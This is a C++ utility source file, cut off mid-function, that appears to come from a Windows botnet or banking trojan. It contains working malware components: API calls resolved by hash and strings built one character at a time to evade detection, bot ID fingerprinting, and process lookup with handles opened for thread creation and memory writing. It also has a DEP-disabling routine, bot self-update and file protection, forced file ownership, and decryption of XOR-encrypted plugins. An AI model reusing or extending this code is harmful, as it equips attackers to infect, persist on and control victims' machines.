#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <Iphlpapi.h>

#include "GetApi.h"
#include "Strings.h"
#include "Crypt.h"
#include "Memory.h"
#include "Utils.h"
#include "Config.h"
#include "BotUtils.h"
#include "md5.h"
#include "ntdll.h"


HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param )
{
    DWORD lpThreadId; 
    return pCreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)lpStartAddress, param, NULL, &lpThreadId );
}


char *GetOSInfo()
{
	char *BotOS = (char*)MemAlloc( 1024 );

	if ( BotOS == NULL )
	{
		return NULL;
	}

	//char Unknown[] = { 'u','n','k','n','o','w','n' };
	
	char WinSeven[]  = {'W','i','n','d','o','w','s',' ','S','e','v','e','n',0};
	char Win2008R2[] = {'W','i','n','d','o','w','s',' ','S','e','r','v','e','r',' ','2','0','0','8',' ','R','2',0};

	char Win2008[]   = {'W','i','n','d','o','w','s',' ','S','e','r','v','e','r',' ','2','0','0','8',0};
	char WinVista[]  = {'W','i','n','d','o','w','s',' ','V','i','s','t','a',0};
	char WinXP[]	 = {'W','i','n','d','o','w','s',' ','X','P',0};
	char Win2003R2[] = {'W','i','n','d','o','w','s',' ','S','e','r','v','e','r',' ','2','0','0','3',' ','R','2',0};
	char Win2003[]   = {'W','i','n','d','o','w','s',' ','2','0','0','3',0};
	char Win2000[]   = {'W','i','n','d','o','w','s',' ','2','0','0','0',0};

	char *ret = NULL;//Unknown;

	OSVERSIONINFOEX OSVersion;
		
	OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEX );

	if ( !pGetVersionExA( &OSVersion ) )
	{
		return NULL;
	}

	if ( OSVersion.dwMajorVersion == 6  )
	{
		if ( OSVersion.dwMinorVersion == 1 )
		{
			if ( OSVersion.wProductType == VER_NT_WORKSTATION )
			{
				ret = WinSeven;
			}
			else
			{
				ret = Win2008R2;
			}
		}
		else if ( OSVersion.dwMinorVersion == 0 )
		{
			if ( OSVersion.wProductType == VER_NT_WORKSTATION )
			{
				ret = WinVista;
			}
			else
			{
				ret = Win2008;
			}
		}
	}
	else if ( OSVersion.dwMajorVersion == 5 )
	{
		if ( OSVersion.dwMinorVersion == 2 )
		{
			if ( pGetSystemMetrics( SM_SERVERR2 ) != 0 )
			{
				ret = Win2003R2;
			}
			else
			{
				ret = Win2003;
			}
		}
		else if ( OSVersion.dwMinorVersion == 1 )
		{
			ret = WinXP;
		}
		else if ( OSVersion.dwMinorVersion == 0 )
		{
			ret = Win2000;
		}		
	}

	if ( ret == NULL )
	{
		return NULL;
	}

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	if ( m_lstrlen( OSVersion.szCSDVersion ) )
	{
		_pwsprintfA( BotOS, "%s %s", ret, OSVersion.szCSDVersion );
	}
	else
	{
		_pwsprintfA( BotOS, "%s", ret );
	}

	BotOS[ m_lstrlen( BotOS ) ] = '\0';

	char *Ret = BotOS;

	return Ret;
}

char * FileToMD5(char *URL)
{
	//char *BotId = (char*)MemAlloc( 2048 );
	MD5_CTX ctx;	

	MD5Init(&ctx);
	MD5Update( &ctx, (unsigned char*)URL, m_lstrlen( URL ) );

	unsigned char buff[16];	
	MD5Final( buff, &ctx );
	char * UidHash =(char*)MemAlloc( 33 );;

	int p = 0;
	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
	
	for( int i = 0; i < 16; i++ )
	{
		_pwsprintfA( &UidHash[p], "%02X", buff[i] );
		p += 2;
	}	
	
	UidHash[32] = '\0';

	
return UidHash;
}

// добавлено при добавлении оперы
/************************************************************************/
DWORD FileSize(HANDLE hFile)
{
	DWORD filesizeHigh = 0;
	DWORD filesizeLow  = 0;
	filesizeLow = (DWORD)pGetFileSize(hFile, &filesizeHigh);

	return (DWORD)(Int64ShllMod32((unsigned hyper)filesizeHigh, 32) | filesizeLow);
	//return ((((unsigned hyper)filesizeHigh) << 32) | filesizeLow);
}

/************************************************************************/
/*                          Читает файл в буфер                         */
/*----------------------------------------------------------------------*/
int ReadWholeFile(char *szFileName, char **OutBuf, int *Error)
{
	*Error = NOERROR;
	int result = 0;

	// Открываем файл на чтение
	HANDLE hFile = pCreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
														OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	// Если не удалось прочесть, выходим с ошибкой
	if (INVALID_HANDLE_VALUE != hFile)
	{
		DWORD fSize = FileSize(hFile);
		if (fSize > 0)
		{
			DWORD rSize = 0;  
			//*OutBuf = new char[fSize + 1];
			//SecureZeroMemory(*OutBuf, fSize + 1);
			*OutBuf = (char *)MemAlloc(SIZE_T(fSize) + 1);
			if (pReadFile(hFile, *OutBuf, fSize, &rSize, NULL))
				result = rSize;
		}
		// Закрываем файл
		pCloseHandle(hFile);
	}
	// Возвращаем результат
	if (!result)
		*Error = pGetLastError();
	return result;
}

/************************************************************************/
char *CalcFileMD5Hash(char *szFileName)
{
	char *fileData = NULL;
	char *UidHash  = NULL;
	
	int Error = 0;
	int fSize = ReadWholeFile((char *)szFileName, &fileData, &Error);
	if (fSize)
	{
		MD5_CTX ctx;	

		MD5Init(&ctx);
		MD5Update( &ctx, (unsigned char*)fileData, fSize );

		UidHash = (char *)MemAllocAndClear(16);;
		MD5Final((unsigned char *)UidHash, &ctx );

		// Из-под файла
		MemFree(fileData);
	}
	return UidHash;
}



//------------------------------------------------------------ 
//гениратция нового уида
int myHashData(DWORD lpData, DWORD dwDataSize) 
{
	DWORD dwResult = 0;
	_asm 
	{
		pushad	
		mov edi, lpData
		mov ebx, 0 //hash
		mov ecx, 0 //cr
		mov eax, dwDataSize		
		cmp eax, 0
		jle ERR_BAD_LEN		
	REPEAT_LABEL:
		xor cl, BYTE ptr [edi]  // cr
		xor bl, BYTE ptr [edi]  // cl 
	WHILE_LABEL:
		sub cl, 32
	 		//.endw
		cmp cl, 32
		jge WHILE_LABEL
		rol ebx, cl
		inc edi
		mov dl, BYTE ptr [edi] // cr
		dec eax		
		cmp eax, 0
		jne REPEAT_LABEL
	ERR_BAD_LEN:
		mov dwResult, ebx	
		popad	
		mov eax, dwResult
	}
}


PCHAR MakeMachineID()
{
	//данная функция вернет PCHAR который мочить STR::Free
	
	char szRegPath1[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\0";
	char szDigitalProductId[] = "DigitalProductId\0";
	char szInstallDate[] = "InstallDate\0";
	char szRegId[] = "RegId\0";

	DWORD dwMakeMachineID_done = 0;
	PCHAR szMachineID = STR::Alloc(17) ;
	DWORD iBufferSize = 0;
	int flShouldMakeUniqID = 0;
	DWORD dwExtraHashForMachineID = 0;

	// really run only once
	if (!dwMakeMachineID_done)
	{
		// try to open some reg key
		HKEY hKey = 0;
		if ( pRegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)szRegPath1, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS )
		{
			// prepare pCryptKeyBuff
			PVOID pCryptKeyBuff;
			//теоретически правельно использовать размер в страницу, ибо в МСДН написано что все что больше нее храниться не в реестре
			//но читаемый размер всегда равен 164 байта берем с небольшим запасом
			pCryptKeyBuff = STR::Alloc(200); ///pGlobalAlloc(GPTR, 10240);
			// init buffer with not-null pre-defined data to avoid clear data in registry in case of absent DigitalProductId in registry
			m_memset(pCryptKeyBuff, 0x30, 100);

			// try to query DigitalProductId
			iBufferSize = 200;
			if ( pRegQueryValueExA(hKey, (LPCSTR)szDigitalProductId, NULL, NULL, (LPBYTE) pCryptKeyBuff, &iBufferSize) != ERROR_SUCCESS ) 
			{
				flShouldMakeUniqID+=1; 
			}
			// make dwExtraHashForMachineID value
			iBufferSize = 4;
			if ( pRegQueryValueExA(hKey, (LPCSTR)szInstallDate, NULL, NULL, (LPBYTE) &dwExtraHashForMachineID, &iBufferSize) != ERROR_SUCCESS ) 
			{
				flShouldMakeUniqID+=1; 
			}
			// check if we should create / use some uniq id
			if (flShouldMakeUniqID > 0) 
			{
				// first try to read existing extra value into dwGeneratedMachineIDExtraValue
				DWORD dwGeneratedMachineIDExtraValue = 0;
				iBufferSize = 4;
				if ( pRegQueryValueExA(hKey, (LPCSTR)szRegId, NULL, NULL, (LPBYTE) &dwGeneratedMachineIDExtraValue, &iBufferSize) != ERROR_SUCCESS ) 
				{	
					// failed to read extra value, get it from ticks
					// NB: we should use it ONLY if id saved successfully - otherwise to protect self from constant change of 
					//     machine ids, leave dwGeneratedMachineIDExtraValue 0
					dwGeneratedMachineIDExtraValue = (DWORD)pGetTickCount();

					// now try to save it in registry - close read-only handle
					pRegCloseKey(hKey); 

					// try to open in write mode
					if ( pRegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)szRegPath1, 0, KEY_READ + KEY_WRITE, &hKey) == ERROR_SUCCESS ) 
					{					
						// try write key, with error-checking
						if ( pRegSetValueExA(hKey, (LPCSTR)szRegId, NULL, REG_DWORD, (LPBYTE) &dwGeneratedMachineIDExtraValue, 4) != ERROR_SUCCESS ) 
						{
							 dwGeneratedMachineIDExtraValue=0;
						}
					} else { dwGeneratedMachineIDExtraValue=0; }
 				}

				// use extra value in any case
				dwExtraHashForMachineID = dwExtraHashForMachineID ^ dwGeneratedMachineIDExtraValue;
			}

			// close reg key
			pRegCloseKey( hKey );

			// shift pCryptKeyBuff pointer by 8 bytes
			// *** now this is MakeMachineID_step2 contents ***

			// make hash from WinID (16+1 bytes from pCryptKeyBuff) [HASH PART 1]
			LPVOID pWinId = (PVOID)((DWORD)pCryptKeyBuff + 8);
			DWORD dwHash1 = myHashData( (DWORD)pWinId, (int)plstrlenA((LPCSTR)pWinId) ) ^ dwExtraHashForMachineID;

			//printf("hash p1 = %04Xh dwExtraHashForMachineID = %04Xh\n", dwHash1, dwExtraHashForMachineID);

			// and part2 using Computer name
			iBufferSize = MAX_COMPUTERNAME_LENGTH+1;
			PCHAR pCompName = STR::Alloc(iBufferSize);//pGlobalAlloc( GPTR,  iBufferSize);
			pGetComputerNameA( (LPSTR)pCompName, &iBufferSize);
			DWORD dwHash2 = myHashData( (DWORD)pCompName, (int)plstrlenA((LPSTR)pCompName));
			STR::Free(pCompName);	// pGlobalFree(pCompName);
			STR::Free((PCHAR)pCryptKeyBuff);
			//pGlobalFree(pCryptKeyBuff);
	
			// combine dwHash1 + dwHash2 into szMachineID
			typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
			fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
			char szMID_format[] = "%08X%08X";

			
			_pwsprintfA(szMachineID, szMID_format, dwHash1, dwHash2);
			
			//printf(szMachineID);			
		}
	}
	// return pointer to global var filled with textual machine-id representation
	return szMachineID;
}



//------------------------------------------------------------
void GenerateUid(char *BotUid)
{
	PCHAR tmp_BotUid = MakeMachineID();

	m_lstrcpy( BotUid, GetPrefix());
	m_lstrcat( BotUid, "0" );
	m_lstrcat( BotUid, tmp_BotUid );
	STR::Free(tmp_BotUid);
	return;


	///далее идет старая
	char *BotId = (char*)MemAlloc( 2048 );
	
	DWORD dwUsernameLen = 255;
	DWORD dwComputerLen = 255;
	
	char *User = (char*)MemAlloc( 255 );
	char *Comp = (char*)MemAlloc( 255 );
	char *Proc = (char*)MemAlloc( 255 );

	if ( BotId == NULL || User == NULL ||
		 Comp  == NULL || Proc == NULL )
	{
		return;
	}

	if ( (BOOL)pGetUserNameA( User, &dwUsernameLen ) )
		m_lstrcat(BotId, User );

	if ( (BOOL)pGetComputerNameA( Comp, &dwComputerLen ) )
		m_lstrcat( BotId, Comp );

	if ( (DWORD)pGetEnvironmentVariableA( "PROCESSOR_IDENTIFIER", Proc, 255 ) )
		m_lstrcat( BotId, Proc );

	MemFree(User);
	MemFree(Comp);
	MemFree(Proc);

//--------------------------

	HW_PROFILE_INFOA HwProfInfo;

	if ( (BOOL)pGetCurrentHwProfileA( &HwProfInfo ) ) 
    {
		m_lstrcat( BotId, HwProfInfo.szHwProfileGuid );
		m_lstrcat( BotId, HwProfInfo.szHwProfileName );
    }   

	char *OS = GetOSInfo();


	if ( OS != NULL )
		m_lstrcat( BotId, OS );

	MemFree(OS);

//--------------------------

	DWORD dwSerial = 0;

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	if ( (BOOL)pGetVolumeInformationA( 0, NULL, 0, &dwSerial, 0, 0, NULL, 0 ) )
		_pwsprintfA(BotId + m_lstrlen(BotId), "%d", dwSerial );

	MD5_CTX ctx;

	MD5Init(&ctx);
	MD5Update( &ctx, (unsigned char*)BotId, m_lstrlen( BotId ) );

	unsigned char buff[16];	

	MD5Final( buff, &ctx );

	char UidHash[33];

	int p = 0;

	for( int i = 0; i < 16; i++ )
	{
		_pwsprintfA( &UidHash[p], "%02X", buff[i] );
		p += 2;
	}	
	
	UidHash[32] = '\0';

	m_lstrcpy( BotUid, GetPrefix());
	m_lstrcat( BotUid, "0" );
	m_lstrcat( BotUid, UidHash );

	BotUid[ m_lstrlen(BotUid) ] = '\0';

    MemFree(BotId);

	return;
}


LPVOID GetInfoTable(DWORD dwTableType )
{
	LPVOID lpPtr = NULL;

	DWORD dwSize = 0x4000;	

	NTSTATUS Status = 0;

	do
	{
		lpPtr = MemAlloc( dwSize );

		if ( lpPtr == NULL )
		{
			return NULL;
		}

		Status = (DWORD)pZwQuerySystemInformation( dwTableType, lpPtr, dwSize, NULL );

		if ( Status == STATUS_INFO_LENGTH_MISMATCH )
		{
			MemFree( lpPtr );
			dwSize = dwSize * 2;
		}
	} while ( Status == STATUS_INFO_LENGTH_MISMATCH );

	if ( Status == STATUS_SUCCESS )
	{
		return lpPtr;
	}

	MemFree( lpPtr );

	return NULL;
}

DWORD GetCurrentSessionId()
{
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	return Peb->SessionId;
}

DWORD GetProcessIdByHash( DWORD dwHash )
{
	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)GetInfoTable( SystemProcessInformation );

	DWORD dwSessionId = 0;

	DWORD dwPid = -1;

	if ( pProcess != NULL )
	{
		dwSessionId = GetCurrentSessionId();

		do
		{
			if ( dwSessionId == pProcess->uSessionId )
			{
				if ( pProcess->usName.Length )
				{
					PCHAR ProcessName = WSTR::ToAnsi(pProcess->usName.Buffer, 0);

					m_lstrlwr( ProcessName );

					DWORD ProcessHash = CalcHash(ProcessName);
					STR::Free(ProcessName);

					if (ProcessHash  == dwHash )
					{
						dwPid = pProcess->uUniqueProcessId;
						break;
					}
				}
			}			

			pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext );

		} while ( pProcess->uNext != 0 );
	}

	MemFree( pProcess );

	return dwPid;
}

DWORD GetProcessHashOfId(DWORD dwPid)
{
	OBJECT_ATTRIBUTES ObjectAttributes =	{ sizeof( ObjectAttributes ) } ;
	CLIENT_ID ClientID;
	PUNICODE_STRING	puStr;
	DWORD hash = -1;
	ULONG len;

	ClientID.UniqueProcess = (HANDLE)dwPid;
	ClientID.UniqueThread  = 0;

	HANDLE hProcess = NULL;


	if ( pZwOpenProcess( &hProcess,  PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
		return -1;
	
	
	puStr = (PUNICODE_STRING)MemAlloc( sizeof(UNICODE_STRING) +sizeof(WCHAR)*(MAX_PATH+1) );
	if (puStr){
		puStr->Length = 0;
		len = puStr->MaximumLength = sizeof(WCHAR)*MAX_PATH ;
		puStr->Buffer =(PWCHAR) (sizeof(UNICODE_STRING) + (PCHAR)puStr); 
		m_memset(puStr->Buffer,0,puStr->MaximumLength);

		//0xa638ce5f	
	
		if( (NTSTATUS)pZwQueryInformationProcess (hProcess,ProcessImageFileName,puStr,len,&len) == STATUS_SUCCESS)
		{
			hash = GetNameHash(puStr->Buffer);
		};
		MemFree(puStr);
	};

	pZwClose(hProcess);
	return hash;
};

char *GetProcessList()
{
	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)GetInfoTable( SystemProcessInformation );	
	
	char *ProcessList = NULL;

	if ( pProcess != NULL )
	{
		do
		{
			if ( pProcess->usName.Length )
			{
				PCHAR ProcessName = WSTR::ToAnsi(pProcess->usName.Buffer, 0);
				m_lstrlwr( ProcessName );

				if ( ProcessList == NULL )
				{
					if ( ( ProcessList = (char*)MemAlloc( m_lstrlen( ProcessName ) + 1 ) ) == NULL )
					{
						return NULL;
					}

					m_lstrcpy( ProcessList, ProcessName );
				}
				else
				{
					char *p = (char*)MemRealloc( ProcessList, m_lstrlen( ProcessList ) + m_lstrlen( ProcessName ) + 2 );

					if ( p == NULL )
					{
						return NULL;
					}

					ProcessList = p;

					m_lstrcat( ProcessList, "," );
					m_lstrcat( ProcessList, ProcessName );
				}
			    STR::Free(ProcessName);
			}

			pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext );

		} while ( pProcess->uNext != 0 );
	}

	MemFree( pProcess );

	return ProcessList;
}


HANDLE OpenProcessEx( DWORD dwHash )
{
	DWORD dwPid = GetProcessIdByHash( dwHash );

	if ( dwPid != -1 )
	{
		OBJECT_ATTRIBUTES ObjectAttributes = { sizeof( ObjectAttributes ) } ;
		CLIENT_ID ClientID;

		ClientID.UniqueProcess = (HANDLE)dwPid;
		ClientID.UniqueThread  = 0;

		HANDLE hProcess;
		
		if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
		{
			return NULL;
		}

		return hProcess;
	}

	return NULL;
}

bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread )
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	m_memset( &si, 0, sizeof( STARTUPINFOW ) );	
	m_memset( &pi, 0, sizeof( PROCESS_INFORMATION ) );	
	
	si.cb		   = sizeof( STARTUPINFO );
	si.dwFlags     = STARTF_USESHOWWINDOW;
	si.wShowWindow = 1;

	if ( (BOOL)pCreateProcessW( Path, NULL, NULL, NULL, FALSE, dwFlags, NULL, NULL, &si, &pi ) != 0 )
	{
		*hProcess = pi.hProcess;
		*hThread  = pi.hThread;

		return true;
	}	

	return false;
}

bool RunFile( WCHAR *Path )
{
	HANDLE hThread;
	HANDLE hProcess;

	if ( RunFileEx( Path, NORMAL_PRIORITY_CLASS, &hProcess, &hThread ) )
	{
		return true;
	}

	return false;
}

DWORD GetVirtualFreeAddr()
{
	DWORD dwAddr = (DWORD)GetProcAddressEx( NULL, 1, 0x5C17EC75 );
	return dwAddr;
}

bool MakeUpdate( WCHAR *FileName )
{
	WCHAR *BotPath = GetBotPath();

	if ( !BotPath )
	{
		return false;
	}

	if ( (DWORD)pGetFileAttributesW( FileName ) != INVALID_FILE_ATTRIBUTES )
	{
		UnProtectBot();
		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_ARCHIVE );
		pMoveFileExW( FileName, BotPath, MOVEFILE_REPLACE_EXISTING );
		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
		RunFile( BotPath );
		pExitProcess( 1 );
	}

	MemFree( BotPath );

	return true;
}

DWORD GetFileHash( WCHAR *File )
{
	if ( !File )
	{
		return -1;
	}

	HANDLE hFile = (HANDLE)pCreateFileW( File, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return -1;
	}

	DWORD h = 0;
	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );

	HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );

	if ( hMapFile == INVALID_HANDLE_VALUE )
	{
		return -1;
	}

	LPBYTE pbyFile  = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

	char Hash[33];
	m_memset( Hash, 0, 33 );

	if ( pbyFile != NULL )
	{
		MD5_CTX ctx;	

		MD5Init(&ctx);
		MD5Update( &ctx, (unsigned char*)pbyFile, dwFileSize );

		unsigned char buff[16];	

		MD5Final( buff, &ctx );

		typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
		fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

		int p = 0;

		for( int i = 0; i < 16; i++ )
		{
			_pwsprintfA( &Hash[p], "%02X", buff[i] );
			p += 2;
		}	
		
		Hash[32] = '\0';	
	}

	pUnmapViewOfFile( pbyFile );

	pCloseHandle( hFile );
	pCloseHandle( hMapFile );

	if ( !m_lstrlen( Hash ) )
	{
		return -1;
	}

	return CalcHash( Hash );
}


bool GodmodeOnFile( WCHAR *Filename )
{
	BOOLEAN bWasEnabled;
	pRtlAdjustPrivilege( SE_TAKE_OWNERSHIP_PRIVILEGE, TRUE, FALSE, &bWasEnabled );

	HANDLE hToken = NULL;
	pOpenProcessToken( pGetCurrentProcess(), TOKEN_QUERY, &hToken );
	
	PTOKEN_USER pTokenUser = (PTOKEN_USER)MemAlloc( 0x200 );

	if ( pTokenUser == NULL )
	{
		return false;
	}

    DWORD dwSize = 0;
    SECURITY_DESCRIPTOR sdSID;

    if ( !(BOOL)pGetTokenInformation( hToken,(TOKEN_INFORMATION_CLASS)1, pTokenUser, 0x200, &dwSize ) )
	{
		return false;
	}

    if ( !(BOOL)pInitializeSecurityDescriptor( &sdSID, SECURITY_DESCRIPTOR_REVISION ) )
	{
		return false;
	}

    if ( !(BOOL)pSetSecurityDescriptorOwner( &sdSID, pTokenUser->User.Sid, false ) )
	{
		return false;
	}

	pCloseHandle( hToken );
	
	if ( !pSetFileSecurityW( Filename, OWNER_SECURITY_INFORMATION, &sdSID ) )
	{
		return false;
	}
    if ( !pSetFileSecurityW( Filename, DACL_SECURITY_INFORMATION, &sdSID ) )
	{
        return false;
	}

	MemFree( pTokenUser );

	return true;
}

DWORD GetProcessHash()
{
	WCHAR ModulePath[ MAX_PATH ];
	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	return dwProcessHash;
}

HANDLE hBotFile;
HANDLE hBotMap;

void ProtectBot()
{
	WCHAR *BotPath = GetBotPath();

	if ( BotPath )
	{
		hBotFile = (HANDLE)pCreateFileW( BotPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

		if ( hBotFile != (HANDLE)-1 )
		{			
			hBotMap = (HANDLE)pCreateFileMappingW( hBotFile, NULL, PAGE_READONLY, 0, 0, NULL );		
		}
	}

	MemFree( BotPath );
	return;
}

void UnProtectBot()
{
	pCloseHandle( hBotMap  );
	pCloseHandle( hBotFile );

	return;
}


void DisableDEP()
{
	DWORD dwFlags = 0x02;
	pZwSetInformationProcess( (HANDLE)-1, 0x22, &dwFlags, 4 );
}

LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen )
{
	if ( Pointer != NULL && dwLen > 4 )
	{
		char Signature[] = {'B','J','B',0};

		if ( m_memcmp( Pointer, Signature, 3 ) )
		{
			MemFree( Pointer );
			return NULL;
		}

		dwLen -= 3;
		Pointer = (LPBYTE)( (DWORD)Pointer + 3 );
	}
	else
	{
		return NULL;
	}

	DWORD dwPassLen = *(DWORD*)Pointer;

	Pointer	 += sizeof( DWORD );
	dwLen	 -= sizeof( DWORD );

	char *Password = (char*)MemAlloc( dwPassLen + 1 );
	
	m_memcpy( Password, Pointer, dwPassLen );

	Password[ dwPassLen ] = '\0';

	Pointer += dwPassLen;
	dwLen	-= dwPassLen;

	DWORD dwSize = XORCrypt::Crypt( Password, Pointer, dwLen );

	return Pointer;
}


DWORD ExplorerPid = 0;

DWORD GetExplorerPid()
{
	// Функция возвращает идентификатор процесса эксплорера (Explorer.exe)

	if ( !ExplorerPid )
	{
		// Первым этапом пытаемся получить идентификатор по хэндлу окна системного
		// трэя.
		char Class[] = {'S','h','e','l','l','_','T','r','a','y','W','n','d',0};
		pGetWindowThreadProcessId(pFindWindowA(Class, NULL), &ExplorerPid);
	
		// В случае если не удалось определить идентификатор по хэндлу окна
		// определяем его по имени запущенного процесса	
		if ( !ExplorerPid )
			ExplorerPid = GetProcessIdByHash(0x490A0972);
	}

	return ExplorerPid;
}

DWORD GetIExplorerPid()
{
	// Функция возвращает идентификатор процесса эксплорера (iExplore.exe)
	//по аналогии с верхней ф-цией
	DWORD iExplorerPid=0;
	//if ( !iExplorerPid )
	{
		// Первым этапом пытаемся получить идентификатор по хэндлу окна iexplorer.exe
		// трэя.
		char Class[] = {'I','E','F','r','a','m','e',0};
		pGetWindowThreadProcessId(pFindWindowA(Class, NULL), &iExplorerPid);
	
		// В случае если не удалось определить идентификатор по хэндлу окна
		// определяем его по имени запущенного процесса	
		if ( !ExplorerPid )
			ExplorerPid = GetProcessIdByHash(0x2500D98F);
	}

	return ExplorerPid;
}

//----------------------------------------------------------------------------

// Набор значений для генератора случайных чисел
static DWORD Random_State[16] = {0};

// Индекс генератора случайных чисел
static unsigned int Random_Index = 0;


void Random::Initialize()
{
	// Инициализируем генератор случайных чисел
	for (int i = 0; i < 16; i++)
	{
		Random_State[i] = (DWORD)pGetTickCount();
		pSleep(3 * i);
	}
}


DWORD Random::Generate()
{
	// Генерировать случайное число
	if (Random_State[0] == 0)
		Initialize();


	DWORD a, b, c, d;
	a = Random_State[Random_Index];
	c = Random_State[(Random_Index + 13) & 15];
	b = a^c^(a << 16)^(c << 15);
	c = Random_State[(Random_Index+9)&15];
	c ^= (c>>11);
	a = Random_State[Random_Index] = b^c;
	d = a^((a << 5) & 0xDA442D20UL);
	Random_Index = (Random_Index + 15) & 15;
	a = Random_State[Random_Index];
	Random_State[Random_Index] = a^b^d^(a << 2)^(b << 18)^(c << 28);
	return Random_State[Random_Index];
}


DWORD Random::Generate(DWORD Min, DWORD Max)
{
	// Генерировать случайное число в диапазоне от Min до Max
	DWORD Range = 0;
	DWORD Min_V = 0;

	if (Max >= Min)
	{
		Range = Max - Min;
		Min_V = Min;
	}
	else
	{
		Range = Min - Max;
		Min_V = Max;
	}

	return Generate() % (Range + 1) + Min_V;
}

PCHAR Random::RandomString(DWORD Length, char Min, char Max)
{
	// Генерировать строку случайных символов
	// Min, Max - диапазон генерации символов
	PCHAR Result = STR::Alloc(Length);
	if (Result == NULL) return NULL;

	PCHAR S = Result;
	for (DWORD i = 0; i < Length; i++, S++)
		*S = (char)Random::Generate(Min, Max);
	return Result;
}


//----------------------------------------------------------------------------
PCHAR GenerateBotID()
{
    const DWORD BufSize = 2048;
	PCHAR Buf = (PCHAR)MemAlloc(BufSize);
	if (Buf == NULL)
		return NULL;
    m_memset(Buf, 0, BufSize);

	GenerateUid(Buf);
	PCHAR Result = STR::New(Buf);

	MemFree(Buf);
    return Result;
}

//----------------------------------------------------------------------------

bool DirExists(PCHAR Path)
{
	// Функция возвращает истину если путь Path существует
  DWORD Code = (DWORD)pGetFileAttributesA(Path);
  return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) != 0);
}
//----------------------------------------------------------------------------

bool FileExistsA(PCHAR FileName)
{
	DWORD Code = (DWORD)pGetFileAttributesA(FileName);
	return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) == 0);
}

bool FileExistsW(PWCHAR FileName)
{
	DWORD Code = (DWORD)pGetFileAttributesW(FileName);
		return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) == 0);
}

//----------------------------------------------------------------------------


bool InvalidPath(char *Path)
{
	// Функция вернёт истину в случае если путь один из ".", ".."
	return (StrSame(Path, ".") || StrSame(Path,".."));
}

struct TRecursiveSearchData
{
	PCHAR Mask;
	LPVOID Data;
    DWORD Attributes;
    TFilesCallBack CallBack;
};

void RecursuveSearchCallBack(PFindData Find, PCHAR Path, LPVOID Data, bool &Cancel)
{
	// Ищем файлы в директории
	TRecursiveSearchData *SD = (TRecursiveSearchData *)Data;
	Cancel = SearchFiles(Path, SD->Mask, false, SD->Attributes, SD->Data, SD->CallBack) == false;
}

bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
				 LPVOID Data, TFilesCallBack CallBack)
{
	// Функция пербирает все поддериктории
	if (STR::IsEmpty(Path) || STR::IsEmpty(Mask) || CallBack == NULL)
		return true;

	PCHAR SearchMask = STR::New(2, Path, Mask);
	if (SearchMask == NULL)
		return true;

	//  Ищем первую директорию
	WIN32_FIND_DATA Find;
	HANDLE File = pFindFirstFileA(SearchMask, &Find);
	//  Директория не найдена, выходим из функции
	if (File == INVALID_HANDLE_VALUE)
	{
		STR::Free(SearchMask);
		DWORD Error = (DWORD)pGetLastError();

		if (Error != 5 /* Нет доступа */ && Recursive && DirExists(Path))
		{
			TRecursiveSearchData SD;
